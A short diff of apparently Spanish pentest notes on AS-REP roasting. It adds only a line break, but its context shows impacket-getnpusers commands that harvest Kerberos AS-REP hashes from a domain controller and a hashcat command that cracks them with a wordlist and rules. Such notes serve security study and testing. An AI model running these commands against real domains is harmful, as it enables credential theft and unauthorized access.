@@ -21,6 +21,7 @@ impacket-getnpusers dominio.local/ -usersfile usuarios.txt -format hashcat -outp
 impacket-getnpusers dominio.local/usuario_valido:Password123 -request -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
 ```
 > Enumeracion con credenciales y -request Obligatorio cuando estás autenticado para indicar que deseas descargar los hashes AS-REP de los usuarios vulnerables encontrados.
+</br>
 > hashcat -m 18200 hashes_asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
 
